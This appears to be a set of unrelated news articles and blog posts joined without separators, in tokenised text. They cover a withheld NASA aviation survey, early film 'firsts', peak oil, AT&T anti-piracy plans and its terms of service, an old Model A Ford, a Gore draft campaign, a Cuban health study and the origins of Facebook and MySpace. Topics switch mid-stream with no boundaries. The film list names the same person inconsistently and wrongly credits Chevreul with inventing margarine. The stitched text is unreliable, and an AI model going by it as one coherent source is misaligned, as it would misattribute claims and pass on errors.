Although to most people NASA is associated with spaceflight , the agency has a long and storied history of aviation safety research .
Its experts study atmospheric science and airplane materials and design , among other areas .
" If the airlines are n't safe I want to know about it , " said Rep. Brad Miller , D - N.C. , chairman of the House Science and Technology investigations and oversight subcommittee .
" I would rather not feel a false sense of security because they do n't tell us . "
Discussing NASA 's decision not to release the survey data , the congressman said : " There is a faint odor about it all . "
Miller asked NASA last week to provide his oversight committee with information on the survey and the decision to withhold data .
" The data appears to have great value to aviation safety , but not on a shelf at NASA , " he wrote to NASA 's administrator Michael Griffin .
The survey 's purpose was to develop a new way of tracking safety trends and problems the airline industry could address .
The project was shelved when NASA cut its budget as emphasis shifted to send astronauts to the moon and Mars .
NASA said nothing it discovered in the survey warranted notifying the Federal Aviation Administration immediately .
Its data showed improvements in some areas , the person who was familiar with the survey said .
Survey managers occasionally briefed the FAA during the project .
At a briefing in April 2003 , FAA officials expressed concerns about the high numbers of incidents being described by pilots because the NASA results were dramatically different from what FAA was getting from its own monitoring systems .
An FAA spokeswoman , Laura Brown , said the agency questioned NASA 's methodology .
The FAA is confident it can identify safety problems before they lead to accidents , she said .
In its space program , NASA has a deadly history of playing down safety issues .
Investigators blamed the 1986 and 2003 shuttle disasters on poor decision making , budget cuts and improperly minimizing risks .
NASA decided to go ahead with a 2006 shuttle launch and is moving ahead with one this week despite safety concerns by NASA engineers in both cases .
Aviation experts said NASA 's pilot survey results could be a valuable resource in an industry where they believe many safety problems are underreported , even while deaths from commercial air crashes are rare and the number of deadly crashes has dropped in recent years .
" It gives us an awareness of not just the extent of the problems , but probably in some cases that the problems are there at all , " said William Waldock , a safety science professor at Embry - Riddle Aeronautical University in Prescott , Ariz .
" If their intent is to just let it sit there , that 's just a waste . "
Officials involved in the survey touted the unusually high response rate among pilots , 80 % , and said they believe it is more reliable than other reporting systems that rely on pilots to voluntarily report incidents .
" The data is strong , " said Robert Dodd , an aviation safety expert hired by NASA to manage the survey .
" Our process was very meticulously designed and very thorough .
It was very scientific . "
Pilot interviews lasted about 30 minutes , with standardized questions about how frequently they encountered equipment problems , smoke or fire , engine failure , passenger disturbances , severe turbulence , collisions with birds or inadequate tower communication , according to documents obtained by the AP .
Pilots also were asked about last - minute changes in landing instructions , flying too close to other planes , near collisions with ground vehicles or buildings , overweight takeoffs or occasions when pilots left the cockpit .
The survey , known officially as the National Aviation Operations Monitoring Service , started after a White House commission in 1997 proposed reducing fatal air crashes by 80 % as of this year .
Crashes have dropped 65 % , with a rate of about 1 fatality in about 4.5 million departures .
NASA had begun to interview general aviation pilots and initially planned to interview flight attendants , air traffic controllers and mechanics before the survey was halted .
In earlier interviews that helped researchers design the NASA survey , pilots said airlines were unaware how frequently safety incidents occurred that could lead to serious problems or even crashes , said Jon Krosnick , a survey expert at Stanford University who helped NASA create the questionnaire .
Krosnick also led a Stanford team that paid for a joint AP - Stanford poll on the environment .
" There are little things going on everyday that rarely lead to an accident but they increase the chances of an accident , " said Krosnick .
" It 's the little things beneath the surface that cause the very infrequent crashes .
You have to tackle those . "
NASA directed its contractor Battelle Memorial Institute , along with subcontractors , on Thursday to return any project information and then purge it from their computers before Oct. 30 .

One of the great things about film , is that it has a self documenting history by its very nature .
Fortunately many important historical ( some relating to film itself ) events have been captured on this medium .
This is , at least in the present time , the closest we can come to travelling back in time .
This is a selection of the most incredible significant firsts in the history of film .
1. Michel Eugene Chevreul 1886
While this is not technically a film , the series of photographs in this montage give the impression of a slow moving picture .
The thing that makes this so amazing is that the man in the pictures , Michel Eugene Chevreul ( 1786 – 1889 ) , was born the year that Mozart wrote the Marriage of Figaro ( and was five when Mozart died ) , and he lived during the entire French revolution .
He was born a mere 10 years after the signing of the American Declaration of Independence .
He was 100 years old at the time of filming .
Chevreul created an early form of soap from animal fats and salt , and invented margerine .
This sequence of images predates the first film by 2 years .

2. Roundhay Garden Scene 1888
Historic films are very popular and they all attempt to recreate the period in which they are set .
This film is the first celluloid film created and it gives us a true look at how people looked and , more importantly , carried themselves ( in the case of the women in full corseted gowns ) .
The film only lasts for two seconds but it is enough time to see the characters walking .
It was recorded at 12 frames per second by French inventor Louis Le Prince .
It was filmed at the home of Joseph and Sarah Whitley , in Roundhay , Leeds , West Yorkshire , England on October 14 and the people who appear are Adophe Le Prince ( Louis ’s son ) , Sarah Whitley , Joseph Whitley , and Harriet Hartley .
Ten days after filming , Sarah Whitley ( Le Prince ’s mother - in - law ) died .
Two years later Le Prince vanished mysteriously from a train traveling between Dijon and Paris .
Another two years later , Alphonse was found shot dead in New York after testifying at a patent trial against Edison by the American Mutoscope Company .
3. Monkeyshines 1889 or 1890
This is the first American film ever made .
It was originally designed as a test and was followed by two more .
It was not intended for public display .
The film was made by Edison and Dickson to test the original cylinder Kinetograph format .
4. Dickson Experimental Sound Film 1895
This is the first film made with a combination of sound and motion .
It was made by William Dickson , a Franco - Scottish inventor who is credited with inventing the motion picture camera while employed by Thomas Edison .
The film was produced at the “ Black Maria , ” Edison ’s New Jersey film studio .
There is no evidence that it was ever exhibited in its original format .
The man playing the violin is Dickson .
5. Annabelle Serpentine Dance 1895
Annabelle Whitford ’s Serpentine Dance was the first publically released color film .
It was tinted by hand so it is not the first film recorded in color , but it was still a landmark for its time – 15 years before Hollywood was established .
Whitford was a modern dancer .
Like the clip above , this was filmed at the Black Maria .

6. The Coronation of Tsar Nicholas II 1896
This is one of the first significant news events recorded – the Coronation of Tsar Nicholas II of Russia .
Tsar Nicholas was to be the last Russian Tsar , making this film the only existing moving images of a Russian coronation .
22 years after this day , the Tsar , his wife , and their children would be shot to death by communist revolutionaries .
He is seen as a saint by the Russian Orthodox Church where he is known as Saint Nicholas The Passion Bearer .
This would make him the first saint captured on film .
7. Pope Leo XIII 1890s
Pope Leo XIII was the first Pope to be captured in moving pictures .
William Dickson made this historic film .
After the filming took place , Pope Leo XIII blessed the camera that had been used .
During his reign ( one of the longest in the history of the Papacy ) , Leo caused upsets by demanding that Catholic Italians not vote in the public elections ( he did not recognize the state of Italy ) , and by stating that man does not have a natural right to freedom of thought or speech .
Pope Leo XIII gave special permission for Theresa Martin to enter the convent despite the fact that she was only 15 .
Theresa eventually became known to the world as Saint Theresa of Lisieux and is recognized as a Doctor of the Church .
8. Fantasmagorie
1908
Fantasmagorie was the very first animated cartoon .
It was created by French caricaturist Émile Cohl and is made up of 700 drawings , each of which was double - exposed , leading to a running time of almost two minutes .
Cohl was working for the French studio Gaumont when he produced this cartoon .
9 . The Toll of the Sea 1922
The Toll of the Sea was the first Hollywood feature film to be broadcast entirely in color without need for a special projector .
The film was created using the Technicolor 2 process .
Except for the final reel , the original negatives still exist .
The plot of the film is loosely based upon Madame Butterfly , but it is set in China instead of Japan .
The leading lady is Anna May Wong , the first notable Chinese American actress .
10 . The Jazz Singer 1927
Here we see Al Jolson singing “ My Mammy ” from the film “ The Jazz Singer ” .
This was the first film in history to include synchronized human voices .
At the start of the film when the sounds were first heard , the audience erupted in to a standing ovation .
Half way through the film , Jolson speaks the first words , which were ( prophetically ) : “ Wait a minute , wait a minute .
You ai n’t heard nothin ’ yet ! ”
A mere two years later , the world would see the first full color , full sound movie with the release of “ On with the Show ” .

After oil supplies dry up , what 's Plan B ? Extreme scarcity could be disastrous for U.S. economy

When Hurricane Katrina struck two years ago , Americans learned just how ill - equipped the government is to respond effectively to natural disasters .
But if you think the government 's response to Katrina was inept , brace yourself for peak oil .
Global oil production will hit its peak in the next few years , at which point oil prices will skyrocket and voracious consumers like the United States , China and Europe will quickly drain every last barrel they can afford to buy .
Our per-capita oil consumption is double that of most European nations and more than triple Mexico's , and shows no sign of slowing .
As supplies dwindle , an economic disaster on a par with Katrina will start to unfold .
Global oil demand is at 84 million barrels a day and rising , and there are at most a trillion barrels ' worth still in the ground , most of which is very difficult and expensive to recover .
Do the math , and you 'll see that the end of oil is , at most , 30 years away .
But long before oil actually runs out , economists and energy analysts warn that extreme scarcity will cause prices to soar so high that it will no longer be feasible to use petroleum on a wide scale .
It is the imminence of this supply - demand shortfall that has people like National Petroleum Council member Matthew Simmons and Reps. Roscoe Bartlett , R - Md. , and Tom Udall , D - N.M. , worried - very worried - about our economy 's ability to withstand the end of oil .
Cheap and plentiful oil is the foundation of our economy .
Everything from food production and distribution to the manufacture of clothing , footwear , medications and plastic goods relies heavily on petroleum .
You name it , and we need oil to produce it , ship it and , in many cases , run it .
In February , the U.S. Government Accountability Office dropped a quiet little bombshell : a report on peak oil concluding that there is an urgent need for a swift , coordinated government strategy to assess and develop alternative energy technologies to avert " severe economic damage . "
The agency concluded : " ( T ) he United States , as the largest consumer of oil and one of the nations most heavily dependent on oil for transportation , may be especially vulnerable among the industrialized nations of the world . "
Stark though its conclusion is , the GAO may in fact be understating the gravity of the situation .
The report followed on the heels of a 2005 peak oil risk management report commissioned by the Department of Energy , which warned of the " extremely damaging " and " chaotic " impacts that will ensue if " intensive , " " aggressive " and " expensive " mitigation measures are not put in place at least 10 years ahead of time .
Both reports landed with a dull thud and have been dutifully ignored .
In other words , there is no Plan B .
Depending on whom you ask , the impacts of peak oil range from dire to catastrophic :
At best , get ready for a crippling recession and widespread inflation .
At worst , we face severe global food shortages that threaten wide - scale starvation and an overall breakdown of social and economic institutions .
And if history is any guide , we can expect a series of military invasions into every remaining oil hot spot in the world - invasions that may , by the way , require even more fossil fuels than we could possibly expropriate by force .
Because oil companies and OPEC nations are notorious for overstating their reserves to manipulate the market , it is impossible to predict when exactly the world will start feeling the crunch .
As award - winning New York Times reporter Peter Maas wrote in 2005 , " Because we do not know when a supply - demand shortfall might arrive , we do not know when to begin preparing for it , so as to soften its impact ; the economic blow may come as a sledgehammer from the darkness . "
But here 's a little hint : Crude oil futures hit an all - time high of $ 78.21 per barrel on July 31 .
Prices cannot go much higher without us beginning to feel the foreshocks of a peak oil catastrophe .
Oh , and by the way , natural gas ( which provides 42 percent of California 's power ) is running out , too .
One day , even coal will be gone .
How much longer are we going to wait before we figure out how to survive without fossil fuels ?
The United States has reacted to the threat of peak oil and gas with all the alacrity of its response to climate change .
It is ignoring the looming crisis for as long as it can , just waiting for that sledgehammer to land its first blow .
Eventually , when a recession hits , tax revenue will plummet , and the government will have nowhere near the money it needs to build an alternative energy and transportation infrastructure .
Every year that goes by without an intensive mobilization to build an oil - independent economy diminishes our odds of surviving the end of oil .
States , too , seem to have their heads in the sand .
California , considered a leader in efforts to reduce carbon emissions , just cut funding for mass transit by $ 1.3 billion for the fiscal year .
Like most states , it ignores the urgent need to build a transportation network that does not rely on fossil fuels .
At this point , you might be asking yourself :
When oil becomes scarce , how will I get food ?
That 's a very good question .
Here are a few more :
Will my garbage get picked up ?
How will my water district purify and deliver water and treat sewage without petrochemicals ?
What if I need an ambulance ?
What if my home is one of the 7.7 million that rely on oil for heating ?
Which of my medications are made out of petrochemicals ?
How will I get to work ?
Will I even have a job anymore ?
But do n't just ask yourself .
Ask your elected officials , your public utility district and your grocer .
Ask the U.S. Postal Service , Federal Express and American Airlines .
Ask GM .
If you have one , ask your financial adviser or stockbroker which companies will still be in business after peak oil hits .
Odds are , he or she will give you a blank stare .
While the United States blindly carries on with business as usual , countries such as Sweden , Iceland and Ireland are taking steps to assess and mitigate peak oil impacts .
Oil - rich Iran has begun rationing and has already cut oil consumption by 25 percent .
But here at home , demand for oil is ever on the rise , and there is no talk of conserving reserves for essential goods and services or to develop an alternative energy infrastructure .
Instead , we are on course to squander every last drop on long solo commutes , leisure travel , mountains of plastic junk and the senseless transglobal shipment of unsustainably grown food .
That 's where local government comes in .
Small but growing numbers of municipalities are initiating a process that federal and state leaders should have begun 30 years ago , when domestic oil reserves peaked .
They are , in short , figuring out Plan B .
In May , Oakland appointed an Oil Independent Oakland by 2020 Task Force .
In June 2006 , Portland , Ore. , formed its own Peak Oil Task Force , which got busy fast :
By March of this year , it had released its first major report , urging the city to " act big , act now , " even without further study or analysis .
The report prompted the city to pass a resolution to accelerate oil and gas conservation measures to halve Portland 's fossil fuel consumption .
Last year , San Francisco passed a resolution to assess the city 's vulnerability to oil depletion and to develop a transition plan .
Other cities , from Austin , Texas , to Bloomington , Ind. , are confronting the stark reality and trying their best to figure out how to soften the blow .
Cities are looking at options such as local food cultivation , urban redesign to minimize transportation needs , locally controlled electricity , rainwater catchment systems ( to ensure local access to water for food cultivation ) , energy - efficient mass transit , and the preparation of emergency plans for sudden and severe food , water and energy shortages .
They are embracing bio-regional sustainability - a concept once dismissed as an ecotopian fantasy that is suddenly starting to look like our last best hope .
But cities cannot solve the peak oil problem on their own .
They do n't have the revenue needed to build light - rail networks and wind farms or to store massive grain reserves .
During a recession , they will be in no position to guarantee income supports for millions of laid - off workers .
But the more they do now , while they still have a revenue stream , the better off their residents will be .
If the peak oil doomsday scenarios are to be averted , it will require coordinated action at every level of government , by every sector of the economy and by every community and citizen in the nation .
We are heading into a political era in which the need to come together to invent and support life - sustaining social and economic systems will trump all else .
Some tout alternative energy technologies as the silver bullet that will save us from a peak oil crisis .
But there is a broad consensus among energy analysts that it will be decades before such alternatives are available for wide - scale implementation .
Moreover , some of the alternatives with the strongest political backing , including ethanol and liquefied coal , may cause even more severe global warming than petroleum has .
The United States needs to slam the brakes on fossil fuel consumption .
As if arresting climate change were n't enough of a reason for immediate and strong conservation measures , the end of oil may just force upon Americans a reality we have ignored for far too long :
We cannot go on like this , pedal to the metal , asleep at the wheel .
" If you had to identify , in one word , the reason why the human race has not achieved , and never will achieve , its full potential , that word would be meetings . "
- Dave Barry , Syndicated Columnist .
Storyline :
In the early 1990s , a father got dragged into watching a world wrestling event by two young kids who were thoroughly fascinated by this new craze .
San Jose State auditorium was jam - packed , and dad 's initial impression was that this must be something really good to have attracted so many people .
The wrestlers had interesting names like ' Million Buck Man ' , ' Gravedigger ' , ' Dollar Machine ' , ' Egotist ' , etc .
As the event progressed , the crowd cheered their favorite wrestler whenever he knocked the other guy down and then climbed up on the ropes to jump on his fallen opponent .
Every time that happened , there would be the same kind of noise , and the fallen fellow would seem to be in extreme pain .
Eventually , the referee declared the winner ... and amazingly , even the injured guy was able to get up and walk back to his dressing room .
Being older and wiser , dad was fairly convinced that the whole event was fixed .
As they were driving back , one of the kids asked : " Dad , have you seen anything like this before ? "
Replied the Dad : " Yep , I see this everyday at work . "
" Wow !
How come ? " asked the excited kid .
" Well son , we have many meetings just like what I saw today .
You pretty much know the outcome before the event begins , but people still go through the motions ( just like those wrestlers ) and look seriously engaged ... and in certain seasons with a lot more intensity . "
" And you get paid for all this fun ? " exclaimed the other excited kid .
" Now wait a minute , this is not all that we do at work , and it does n't happen all the time either ... " said dad , afraid his children would develop the wrong value system .
Dad , do you have a million buck man ?
" Yep , plenty ... "
How about Dollar Machine ?
" We call them Finance ... "
And what about Egotists and Grave Diggers ?
" No Comment . "
As they reached home , the kids went running to mom and told her that dad had a real fun job , and that must be the reason why he is spending a lot of time at work .
Reflection :
In the working world , a meeting should be a way to get valuable work done .
If a meeting is going nowhere , do n't go through the motions to fill time .
Blow the whistle and stop it .

You can see the Wolfson chip to the left of the flash .
This is interesting because the iPod Classic had a Cirrus audio chip , which has caused some initial concerns about audio quality .
The iPod touch should not suffer from these problems .
The chip is the same as that in the iPhone , WM8758BG .
The Toshiba flash has part # TH58NVG5D4CTG20 .
Since we have an 8 GB iPod , each of those stacks has 32 Gb ( 4 GB ) of memory .
The Apple - branded ARM has chip markings 339S0029ARM 8900B 0731 NOKCYY2 , while the on - stack memory has markings K4X1GA53PE - XGC3 YME097N6 731 .
The K4 indicates this is Samsung memory , so the chip is probably Samsung manufactured just like the iPhone .
AT&T ; Inc. has joined Hollywood studios and recording companies in trying to keep pirated films , music and other content off its network -- the first major carrier of Internet traffic to do so .
The San Antonio - based company started working last week with studios and record companies to develop anti-piracy technology that would target the most frequent offenders , said James W. Cicconi , an AT&T ; senior vice president .
The nation ’s largest telephone and Internet service provider also operates the biggest cross-country system for handling Internet traffic for its customers and those of other providers .
As AT&T ; has begun selling pay - television services , the company has realized that its interests are more closely aligned with Hollywood , Cicconi said in an interview Tuesday .
The company ’s top leaders recently decided to help Hollywood protect the digital copyrights to that content .

“ We do recognize that a lot of our future business depends on exciting and interesting content , ” he said .
But critics say the company is going to be fighting a losing battle and angering its own customers , and it should focus instead on developing incentives for users to pay for all the content they want .
Few doubt that piracy is a significant problem .
The major U.S. studios lost $ 2.3 billion last year to online piracy and an additional $ 3.8 billion to bootleg DVDs , according to industry statistics .
AT&T ; can help only with the online losses , which the industry said were growing faster than those from counterfeit DVDs .
Cicconi is in Los Angeles to talk at the Digital Hollywood Summit conference in Santa Monica this morning and hopes to discuss the initiative there .

Last week , about 20 technology executives from Viacom Inc. , its Paramount movie studio and other Hollywood companies met at AT&T ; headquarters to start devising a technology that would stem piracy but not violate privacy laws or Internet freedoms espoused by the Federal Communications Commission .
Cicconi said that once a technology was chosen , the company would look at privacy and other legal issues .
“ We are pleased that AT&T ; has decided to take such a strong , proactive position in protecting copyrights , ” Viacom said in a prepared statement .
“ AT&T ; 's support of strong anti-piracy efforts will be instrumental in developing a growing and vibrant digital marketplace and will help ensure that they have a steady stream of great creative content to deliver to their consumers . ”
But public interest groups are wary .

“ The risk AT&T ; faces is fighting the last war by spending money and energy plugging an old hole in the wall when new ones are breaking out , ” said Fred von Lohmann , a senior staff attorney at the Electronic Freedom Foundation .
The San Francisco digital - rights organization has sued AT&T ; , alleging it illegally released customers ’ phone data to the federal government .
Technology is putting unlimited copying power in the hands of consumers , Von Lohmann said , so the answer to piracy ca n’t be trying to stop them from making copies .
“ The answer should be to figure out how to turn them into paying customers , ” he said .
AT&T ;'s decision surprised Gigi B. Sohn , president of Public Knowledge , a digital rights advocacy group .

“ AT&T ; is going to act like the copyright police , and that is going to make customers angry , ” she said .
“ The good news for AT&T ; is that there ’s so little competition that where else are the customers going to go ? ”
Verizon Communications Inc. , which has fiercely guarded the privacy of its customers , has refused so far to offer a network anti-piracy tool .
It defeated in court the recording industry ’s demands to reveal names of those allegedly involved in downloading pirated songs .
In mid-March , executives at Viacom and the Motion Picture Assn. of America separately approached Cicconi with the idea of a partnership .
Content providers have long looked for a network solution to piracy , but no operator had been willing to join with them .
Efforts to date have focused on filtering and other technologies at the end of uploads and downloads of pirated material , but those have largely failed .

The Recording Industry Assn. of America has engendered a barrage of criticism for its efforts at suing people who download copyrighted songs illegally and who trade in bootleg music CDs .
“ They ’ve tried the whack - a - mole approach , and I do n’t think they ’re winning , ” Cicconi said .

Mr. Curtiss has made one major upgrade , installing a Hudson Terraplane engine in 1940 , because , he said , “ I raced kids home from high school with it , but there were a couple of cars I could n’t beat . ”
That allowed it to go more than 80 miles an hour , compared with 55 m.p.h for a standard Model A . “ Then I could beat them all , ” he said .
Part of the car ’s allure is that it has never been restored .
There is a hole in one of the floorboards , cotton is coming out of the seats and some of the paint is wearing off .
Mr. Curtiss has kits to restore it , but he ca n’t bring himself to use them .
“ People just love seeing it the way it is , ” he said .
Mr. Curtiss also has a strong emotional attachment to the car .
He met his wife , Dorothy , shortly after he bought it , when he was 17 and she was 14 ; they had been married 56 years when she died in 1998 .
The initials they carved on the steering wheel as teenagers can still be seen .
“ She was the first and only girl I ever kissed in the car , ” he said .
“ It ’s priceless because of that , as far as I ’m concerned . ”
“ People say , ‘ You ’re probably glad that car ca n’t talk , ’ ” he added .
Mr. Curtiss and Dorothy drove to the New York World ’s Fair in Queens in 1940 , and he drove to six Army camps from Massachusetts to Georgia when he served during World War II .
The Ford Motor Company made slightly more than five million Model A’s from 1928 through 1931 .
Chuck E. Christensen , 68 , technical director of the Model A Ford Club of America , a collectors ’ club based in La Habra , Calif. , said there were an estimated 50,000 to 100,000 of those cars left .
He said longtime owners like Mr. Curtiss were rare .
“ In most cases , the cars have been passed around many times over the years , ” he said .

Net neutrality , anyone ?
What an incredibly slippery slope we 're now hurtling down ...
Scholars &Rogues :
Slashdot broke the news on Saturday that AT&T 's updated terms of service for its high - speed Internet packages essentially forbid you from criticizing the company on pain of cancellation .
The full terms of service are here , and here 's the offending passage highlighted , courtesy of Ars Technica :
AT&T may immediately terminate or suspend all or a portion of your Service , any Member ID , electronic mail address , IP address , Universal Resource Locator or domain name used by you , without notice , for conduct that AT&T believes ( a ) violates the Acceptable Use Policy ; ( b ) constitutes a violation of any law , regulation or tariff ( including , without limitation , copyright and intellectual property laws ) or a violation of these TOS , or any applicable policies or guidelines , or ( c ) tends to damage the name or reputation of AT&T , or its parents , affiliates and subsidiaries .
This is the exact kind of overbroad legalese that gets companies in trouble in ways they probably never thought of .
If I am an AT&T subscriber , for example , and I post derogatory comments about AT&T on a site they own , does this give them leave to terminate my service ?
What if I post or send a complaint about AT&T to a complaint site or consumer news site , like ConsumerAffairs .
Com ( whom I write for ) , and they publish said complaint ?
Am I liable if I was using my AT&T ISP while writing said complaint ?
What if I did so while using my laptop at a Wi -Fi hotspot ?
The mind boggles .
As mentioned in a previous diary , Gore was reportedly " flabbergasted " after the Los Angeles book signing - he was thoroughly , and perhaps surprisingly , impressed by the incredible outpour of support for him and a 2008 candidacy .
Well , the sentiments have seemingly been felt throughout the whole Gore camp .
According to Kalee Kreider , Mr Gore 's communications director , it is already registering .
She said the former vice president was overwhelmed by the campaigners ' entreaties .
" He 's touched .
It 's so heartfelt , " she said .
" And we are seeing it growing . "
This is the same woman who has vehemently and repeatedly put to rest any speculation that Gore might enter the race later this year .
And now she not only acknowledges the impact its having on her boss , but also notes that its " growing . "
Not quite a 180 , but it seems pretty apparent that the huge grassroots support is having some sort of impact .
Likewise , I was at the event earlier today in New York City .
Somewhere between 500 and 750 fans crammed into a Barnes and Noble to hear him speak and get his signature ... during a workday at 12:30 PM .
Unfortunately , those in charge of the bookstore would n't allow us to conduct any draft activities inside , so we were limited to the amount of people we reached .
Nonetheless , a very sizable ( probably between 100- 200 ) minority were sporting Gore 2008 stickers , buttons , and signed a petition urging him to run .
I , like everyone else , waited in line to get Al 's signature , but unlike most others , I had a little note inside of my copy of The Assault on Reason .
On the inside cover I wrote , " Can you be drafted into the 2008 race or am I just wasting my time ? " and afterwards , I included two check boxes / options for him to choose from .
Upon reading it , he let out a hearty laugh and just said " thank you . "
Take it for what you will , but he could have easily checked off the box that said " No , I can not be drafted " which is largely in line with his response on Larry King where he said something to the effect of " politics does not work that way . "
Another interesting anecdote was that the person in front of me in line lived in New Orleans at the time of Katrina .
He resided in a building of a couple hundred senior citizens who were not receiving any help whatsoever from the state or federal government .
Turns out he was at the bookstore to thank Al Gore for rescuing him and the others .
Some of you may recall that Al chartered a plane less than a week after the travesty to help evacuate those still on the ground .
With him , the man had a notebook of the names of many of the people who Gore saved that weekend .
Gore was clearly touched , telling an aid that he would like to " follow up " with the man and wanted a copy of the notebook paper he was just presented - not for free media or to look good , but because he did n't have a record of those he helped out those two days .
The man then thanked him as Mr. President , because in his own words , unlike the man in the White House , Mr. Gore was the only one who acted presidential that week .
Researchers from the Johns Hopkins Bloomberg School of Public Health , Cienfuegos , Cuba and Loyola University had a unique opportunity to observe the impact of population - wide weight loss due to sustained reductions in caloric intake and an increase in energy output .
This situation occurred during the economic crisis of Cuba in 1989 - 2000 .
As a result , obesity declined , as did deaths attributed to diabetes , coronary heart disease and stroke .
" This is the first , and probably the only , natural experiment , born of unfortunate circumstances , where large effects on diabetes , cardiovascular disease and all - cause mortality have been related to sustained population - wide weight loss as a result of increased physical activity and reduced caloric intake , " said Manuel Franco , MD , a PhD candidate in the Bloomberg School of Public Health 's Department of Epidemiology .
" Population - wide approaches designed to reduce caloric intake and increase physical activity , without affecting nutritional sufficiency , might be best suited for the prevention of cardiovascular disease and diabetes . "
The study authors gathered data on energy intake , body weight and physical activity using previously published literature from the Cuban National Institute of Hygiene , Epidemiology and Microbiology , the Food and Agriculture Organization of the United Nations , the Cuban First and Second National Surveys on Risk Factors and Chronic Diseases and the Cuban Ministry of Public Health .
There was a drop in the daily per capita food availability from the late 1980s to 1995 , resulting in a daily energy intake decline from 2,899 kcal in 1988 to 1,863 kcal in 1993 .
In 1987 , 30 percent of Havana residents were physically active .
From 1991 to 1995 , 70 percent of Cubans were physically active as a result of widespread use of bicycles and walking as means of transportation .
Obesity prevalence in Cienfuegos , Cuba , decreased from 14.3 percent in 1991 to 7.2 percent in 1995 .
During the end of the Cuban economic downturn and the years following it , there were substantial declines in cardiovascular disease , type 2 diabetes and all - cause mortality .
The researchers report a plateau in the number of deaths from diabetes during the food shortage of 1988 - 1996 , when physical activity increased and obesity decreased .
" Future steps towards prevention of cardiovascular disease and diabetes should focus on long - term population - wide interventions by encouraging physical activity and the reduction of caloric intake , " explained Franco , who is also affiliated with the Johns Hopkins Welch Center for Prevention and Epidemiology .
Johns Hopkins researchers Manuel Franco , Benjamin Caballero , Mariana Lazo and Eliseo Guallar co-authored " Impact of Energy Intake , Physical Activity and Population - wide Weight Loss on Cardiovascular Disease and Diabetes Mortality in Cuba , 1980 - 2005 " .
Additional co-authors are Pedro Orduñez , Jose A. Tapia Granados , Jose Luis Bernal and Richard S. Cooper .
The study was published September 19 , 2007 , as an Advance Access study by the American Journal of Epidemiology .
Dr. Manuel Franco was funded by grants from the Fulbright Commission and the Welch Center for Prevention , Epidemiology and Clinical Research .

The humble beginnings of many popular Web services , such as Google , LiveJournal , and Yahoo ! , are well - documented and available on their websites , and frequently recounted in news stories about the firms .
These websites are also scrutinized for any perceived violations of users ' privacy or other basic rights .
However , until recently , no investigation had been done into MySpace and Facebook , two new " social networking " sites of explosive popularity among teenagers and college students .
American bloggers , using Google and financial records , have begun investigations into the origins and policies of these sites , making some claims that the site owners explicitly deny .
Facebook
Facebook was founded by Mark Zuckerberg , an individual web developer looking to make friends at Harvard University .
Although Facebook has been sued by ConnectU.com for allegedly copying its concept and data , Facebook is actually the first worldwide college network on the Internet .
As one of the most popular college websites , Facebook is notable for its lack of prominent advertising .
It quickly accumulated $ 50,000 in debt in 2004 , and it took nearly a year for it to begin turning a profit , so clearly it needed a large amount of venture capital .
In August 2005 , independent blogger Josh Smith theorized that Facebook could actually be a data - gathering operation .
He determined that Facebook received its initial funding from Peter Thiel , which he named as co-author of the book " The Diversity Myth " , which argues that " multiculturalism " is used to promote social intolerance on American college campuses .
Smith also found that Facebook also received $ 13 million in funding from " Accel Partners " , a firm whose manager James Breyer formerly served as the chairman of In - Q - Tel , a venture capital firm operated by the United States Central Intelligence Agency .
However , both Accel Partners and Peter Thiel have invested in many dot - com companies .
Peter
Thiel is the co-founder of PayPal , and James Breyer has done extensive work in Silicon Valley .
Investigating a firm 's sources of venture capital has not often led to breakthrough exposes in the past .
More importantly , Smith discovered clauses in Facebook 's current Privacy Policy which state that they " may share your information with third parties , including responsible companies with which we have a relationship " .
The Privacy Policy also warns that " Facebook also collects information about you from other sources , such as newspapers and instant messaging services .
This information is gathered regardless of your use of the Web Site . "
Other bloggers have also called attention to this ambiguous statement , which seems to point towards a Facebook conspiracy theory .
User " timg " at the Reddit news website noted that " these sites provide possibly the most accurate and easiest to use resource for mining information about groups of people . "
According to Chris Hughes , spokesperson for Facebook ,
The clause you reference in the privacy agreement is leftover from an outdated version of the privacy policy which is currently being updated .
We used to have a couple features on the site that are n't still there , such as collecting users ' away messages from AIM ( if they said they wanted it ) and displaying mentions of their names in campus newspapers ( again , upon request ) .
That clause will not be included in the upcoming version of the privacy policy which will be released in the next couple of weeks .
The main issue surrounding Facebook is one of trust .
Privacy advocates on the Web are always wary of any website that asks for detailed personal information , and Facebook takes this to the extreme by displaying entire social networks .
However , most Facebook users seem to trust it deeply , providing full friends lists , phone numbers , and personal photo albums .
MySpace
Trent Lapinski , another blogger , began an investigation into MySpace in July 2005 , when it was acquired by Rupert Murdoch 's News Corporation , parent company of FOX News .
MySpace does not often receive criticism about privacy issues , as its users typically do not give out last names or other personal information , but its company history is more interesting .
Lapinski was threatened with a lawsuit by MySpace 's legal team when he let them know about his investigation , but on January 4 , he decided to come forward with the details anyway .
MySpace expressed interest in commenting on this Wikinews article but did not respond by press time .
MySpace 's CEO Chris DeWolfe and its most prominent spokesperson Tom Anderson first met in 1999 at Xdrive Technologies , a dot - com startup which gave away free storage space to Internet users .
DeWolfe and Anderson went on to work together at ResponseBase , LLC. , which was acquired by eUniverse , Inc. , which later became Intermix Media .
The relationship between these three companies is tangled indeed , and involves the MySpace name itself .
MySpace banner from 2001 , 2 years before the site was allegedly founded .
According to Chris DeWolfe , " the general MySpace site " was launched in September 2003 .
Tom Anderson claims that " MySpace was a creative idea before it was a business . "
However , long before MySpace became a social networking website , the name MySpace and the domain myspace.com had been used by ResponseBase for their profitable newsletter about " Freebies , Deals , & Discounts " , and a free disk space host similar to Xdrive .
Newsgroup archives show multiple messages linking to copyrighted files hosted on MySpace .
In 2001 , MySpace 's spokesperson was quoted in an article about " warez " .
The Internet Archive has backups of MySpace.com going back to 1999 , but these cannot be accessed because MySpace 's current owners have blocked the Internet Archive specifically from accessing the site .
One newsgroup message from 2001 documents the transition from MySpace to ResponseBase :
Got more steaming piles of spam from " Media Now ! " aka " responsebase.com " .
The specific username that the spams were sent to was only given to a specific company ( freediskspace.com , later myspace.com ) for their use only .
Unfortunately they sold it , even though my business relationship with them ended in May 2001 when they discontinued the service I was using .
Apparently they could n't pay their bills and sold their list to spammers .
Actually , MySpace had simply shut down and become ResponseBase -- as evidenced by the " Freebies " newsletter above .
ResponseBase also used a list of 8 million e-mail addresses purchased from Xdrive for their newsletters .
In 2002 , ResponseBase was booted from their ISP as an illicit spam organization -- with Tom Anderson himself listed as their billing contact .
And later still , ResponseBase would be renamed to MySpace .
In 2002 , DeWolfe went on to become a director of " Fog Cutter Capital Group " , whose CEO , Andrew Wiederhorn , was convicted of income tax and pension felonies and sentenced to prison .
